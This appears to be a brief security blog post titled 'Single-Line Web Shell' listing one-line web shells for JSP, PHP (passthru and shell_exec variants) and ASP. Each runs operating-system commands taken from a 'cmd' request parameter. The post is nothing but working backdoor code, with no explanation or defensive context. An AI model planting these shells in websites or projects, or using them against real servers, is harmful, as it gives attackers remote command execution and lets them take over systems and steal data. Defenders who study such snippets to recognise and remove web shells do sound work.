---
layout: post
title: "Single-Line Web Shell"
date: 2015-12-14 22:52:46 +0800
comments: true
categories:
- Security
---

<!--more-->
## JSP

{% highlight jsp linenos %}
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
{% endhighlight %}

## PHP

{% highlight php linenos %}
<?php echo passthru($_GET['cmd']); ?>
{% endhighlight %}

{% highlight php linenos %}
<?php echo shell_exec($_GET['cmd']); ?>
{% endhighlight %}

## ASP

```
<% eval request("cmd") %>
```
